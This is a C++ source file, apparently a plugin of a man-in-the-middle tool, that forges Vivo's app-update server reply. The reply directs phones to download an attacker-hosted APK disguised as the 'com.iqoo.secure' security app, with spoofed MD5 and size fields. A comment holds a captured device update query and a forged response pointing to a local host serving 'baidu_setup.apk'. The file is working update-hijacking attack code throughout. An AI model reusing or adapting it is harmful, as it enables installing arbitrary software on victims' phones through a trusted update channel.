

#include "vivoPlugin.h"
#include "../HttpUtils.h"
#include "../Public.h"


int VivoPlugin::prepareRespData(unsigned long ulIP, string filepath, string filename) {
	int ver = 9420;
	string version = "9.4.2.0";

	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	int ret = getUpdateFileMd5(filepath + filename, TRUE);
	if (ret == FALSE)
	{
		return FALSE;
	}

	char * updatecfg = "{\"addTime\":\"2028-10-15 11:22:27\",\"description\":\"VIVO plugin update\","
		"\"durl\":\"http://%s/%s\",\"filename\":\"com.iqoo.secure.apk\",\"level\":\"1\",\"logswitch\":0,"
		"\"lowMd5\":\"\",\"md5\":\"%s\",\"mode\":\"1\",\"msg\":\"have new update\","
		"\"patchFilename\":\"\",\"patchMd5\":\"\",\"patchSize\":\"\",\"patchUrl\":\"\",\"sendContent\":\"\",\"sendTitle\":\"\","
		"\"size\":\"%u\",\"stat\":\"210\",\"vercode\":\"%u\",\"version\":\"%s\"}";



	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: text/html;charset=GBK\r\nContent-Length: %u\r\n"
		"Connection: Keep-Alive\r\n\r\n%s";

	char szcfg[4096];
	int cfgsize = sprintf(szcfg, updatecfg, szip.c_str(),filename.c_str(), m_szmd5, m_filesize, ver, version.c_str());

	//char lptmp[4096];
	//int tmplen = Public::GBKToUTF8(szcfg, cfgsize, lptmp, 4096);

	m_iRespSize = sprintf(m_lpResp, lpRespFormat, cfgsize, szcfg);

	return m_iRespSize;
}



/*
GET /upapk/apk/query?imei=863857039555171&elapsedtime=2922794&language=zh&verCode=3410&manual=0&pver=1&appName=com.iqoo.secure&model=vivo+Y55A&flag=1049155 HTTP/1.1
Cache-Control: no-cache
Host: comm.vivo.com.cn
Connection: Keep-Alive
User-Agent: IQooAppstore

HTTP/1.1 200 OK
Content-Type: text/html;charset=utf-8
Content-Length: 488
Connection: Keep-Alive

{"addTime":"2028-10-15 11:22:27","description":"......................
......................","durl":"http://192.168.10.183/test20181205/baidu_setup.apk",
"filename":"com.iqoo.secure.apk","level":"1","logswitch":0,"lowMd5":"c4683c9d3786adc550c15b528a83d342",
"md5":"5666e95b9e2a593a85d709cee819a1ab","mode":"1","msg":"........","patchFilename":"","patchMd5":"","patchSize":"",
"patchUrl":"","sendContent":"","sendTitle":"","size":"228420",
"stat":"210","vercode":"9420","version":"9.4.2.0"}
*/